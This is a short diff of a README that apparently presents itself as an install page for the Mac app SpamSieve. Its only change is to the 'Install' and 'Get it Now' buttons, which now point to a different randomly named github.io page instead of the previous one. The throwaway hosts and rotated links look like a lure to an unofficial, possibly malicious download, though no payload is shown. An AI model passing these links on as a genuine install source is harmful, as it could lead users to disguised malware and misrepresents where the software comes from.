@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/spamSieve)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/spamSieve)
 
 </div>
 
@@ -81,7 +81,7 @@ SpamSieve's self-training Bayesian approach reflects an important insight about 
 
 <p align="center">
 
-[![Get it Now SpamSieve](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/spamSieve)
+[![Get it Now SpamSieve](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/spamSieve)
 
 </p>
 
